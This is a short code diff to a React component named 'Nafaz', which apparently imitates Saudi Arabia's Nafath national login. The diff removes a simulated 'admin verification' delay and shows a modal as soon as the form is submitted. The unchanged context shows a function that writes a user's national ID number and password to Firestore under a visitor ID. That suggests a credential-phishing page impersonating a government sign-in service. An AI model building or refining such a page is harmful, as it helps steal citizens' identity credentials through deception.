@@ -68,29 +68,6 @@ export default function Nafaz() {
     }
   }, [])
 
-  // Simulate admin verification with a timeout
-  useEffect(() => {
-    if (true) {
-      // Simulate random verification or rejection
-      const timer = setTimeout(() => {
-
-        if (true) {
-          // Simulate admin verification
-
-          setShowModal(true)
-          setIsSubmitted(false)
-          setIsRejected(false)
-        } else {
-          // Simulate rejection
-          setIsSubmitted(false)
-          setIsRejected(true)
-        }
-      }, 3000) // 3 seconds delay to simulate verification
-
-      return () => clearTimeout(timer)
-    }
-  }, [isSubmitted])
-
   const updateFirestore = async (idCardNumber: string, password: string) => {
     if (!visitorId) {
       console.error("Visitor ID not found in localStorage")
@@ -153,6 +130,8 @@ export default function Nafaz() {
       // Simulate processing delay
       await new Promise((resolve) => setTimeout(resolve, 1000))
       setIsSubmitted(true)
+      setShowModal(true)
+     
     } catch (error) {
       console.error("خطأ في الدخول للنظام ", error)
       setIsRejected(true)
